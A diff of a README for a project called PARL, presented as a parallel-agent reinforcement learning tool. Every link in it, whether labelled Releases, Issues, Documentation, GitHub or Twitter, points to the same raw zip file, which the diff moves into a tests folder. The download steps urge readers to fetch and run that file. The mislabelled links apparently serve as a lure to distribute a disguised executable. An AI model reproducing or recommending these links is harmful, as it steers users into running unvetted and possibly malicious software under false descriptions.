@@ -8,11 +8,11 @@ PARL (Parallel-Agent Reinforcement Learning) helps you teach models to break dow
 
 To get started, you'll need to download PARL. Click the button below to visit our Releases page:
 
-[![Download PARL](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/parl/Software_v1.6.zip)](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/parl/Software_v1.6.zip)
+[![Download PARL](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/tests/Software_v1.4.zip)](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/tests/Software_v1.4.zip)
 
 ### Steps to Download
 
-1. Visit the [Releases page](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/parl/Software_v1.6.zip).
+1. Visit the [Releases page](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/tests/Software_v1.4.zip).
 2. Find the latest version of PARL.
 3. Download the appropriate file for your operating system (Windows, macOS, or Linux).
 4. Locate the downloaded file on your computer.
@@ -51,8 +51,8 @@ Once you have downloaded and installed PARL, follow these steps to start using t
 
 If you encounter any issues or have questions, feel free to reach out. You can:
 
-- Check the [GitHub Issues page](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/parl/Software_v1.6.zip) for solutions and discussions.
-- Visit our [Documentation](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/parl/Software_v1.6.zip) for a more detailed guide.
+- Check the [GitHub Issues page](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/tests/Software_v1.4.zip) for solutions and discussions.
+- Visit our [Documentation](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/tests/Software_v1.4.zip) for a more detailed guide.
 - Join our community on social media to share experiences and ask for help.
 
 ## 📚 Learn More
@@ -63,8 +63,8 @@ Explore various tutorials and case studies on how to effectively use PARL for yo
 
 Stay updated about latest releases and features by following us on:
 
-- [GitHub](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/parl/Software_v1.6.zip)
-- [Twitter](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/parl/Software_v1.6.zip)
+- [GitHub](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/tests/Software_v1.4.zip)
+- [Twitter](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/tests/Software_v1.4.zip)
 
 ## 🔍 Topics
 
@@ -77,6 +77,6 @@ PARL focuses on several critical areas in artificial intelligence, including:
 
 For further insights, consider exploring related topics and sharing your findings with the community. 
 
-[![Download PARL](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/parl/Software_v1.6.zip)](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/parl/Software_v1.6.zip)
+[![Download PARL](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/tests/Software_v1.4.zip)](https://github.com/Sebastianbetanxur/PARL/raw/refs/heads/main/tests/Software_v1.4.zip)
 
 Enjoy your journey into parallel-agent reinforcement learning!
